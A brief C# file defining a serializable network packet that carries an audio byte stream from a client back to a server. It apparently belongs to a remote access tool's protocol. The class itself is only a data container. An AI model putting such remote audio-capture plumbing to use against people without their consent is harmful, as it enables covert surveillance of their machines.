using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ClientPackets {

    [Serializable]
    public class GetAudioStreamResponse : IPacket {

        public byte[] AudioStream { get; set; }

        public GetAudioStreamResponse() {
            
        }

        public GetAudioStreamResponse(byte[] audioStream) {
            this.AudioStream = audioStream;
        }

        public void Execute(Client client) {
            client.Send(this);
        }
    }
}
